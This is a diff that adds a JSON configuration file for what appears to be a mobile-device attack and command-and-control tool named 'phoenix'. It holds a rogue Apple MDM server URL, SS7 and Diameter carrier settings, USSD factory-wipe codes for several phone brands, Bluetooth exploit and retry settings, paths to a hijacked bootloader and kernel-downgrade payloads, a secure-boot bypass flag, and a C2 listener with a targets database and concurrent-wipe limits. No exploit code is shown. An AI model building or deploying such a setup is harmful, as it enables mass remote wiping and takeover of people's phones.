@@ -1,0 +1,53 @@
+{
+    "cloud": {
+        "google_mdm_endpoint": "https://androidmanagement.googleapis.com/v1",
+        "apple_mdm_server_url": "https://phoenix-c2.local/mdm",
+        "huawei_mdm_endpoint": "https://cloud.huawei.com/api/mdm/v1",
+        "max_concurrent_cloud_ops": 50
+    },
+    "carrier": {
+        "ss7_gateway_host": "127.0.0.1",
+        "ss7_gateway_port": 2905,
+        "ss7_global_title": "1234567890",
+        "ss7_ssn": 7,
+        "diameter_host": "127.0.0.1",
+        "diameter_port": 3868,
+        "diameter_realm": "phoenix.local",
+        "diameter_origin_host": "c2.phoenix.local",
+        "ussd_wipe_codes": {
+            "samsung": "*2767*3855#",
+            "huawei": "*#*#2846579#*#*",
+            "generic": "*2767*3855#",
+            "lg": "*2767*2878#",
+            "sony": "*#*#7378423#*#*"
+        }
+    },
+    "bluetooth": {
+        "scan_timeout_sec": 10,
+        "exploit_max_retries": 50,
+        "ble_payload_size": 2024,
+        "l2cap_exploit_enabled": true,
+        "edl_loader_path": "/app/tools/edl_loader.py",
+        "btlejack_path": "btlejack"
+    },
+    "firmware": {
+        "abl_payload_path": "/app/payloads/hijacked_abl.img",
+        "edl_interface": "usb",
+        "qfuse_path": "qfuse",
+        "downgrade_kernel_path": "/app/payloads/downgrade_kernel.img",
+        "secureboot_bypass_enabled": true,
+        "max_partition_overwrite_mb": 512
+    },
+    "c2": {
+        "listen_host": "0.0.0.0",
+        "listen_port": 443,
+        "callback_port": 4444,
+        "use_ssl": false,
+        "db_path": "/app/db/targets.db",
+        "log_level": "INFO",
+        "max_concurrent_wipes": 10,
+        "wipe_cooldown_sec": 0.5,
+        "ai_fuzzer_enabled": true,
+        "ai_fuzzer_aggressive_level": 9000
+    }
+}
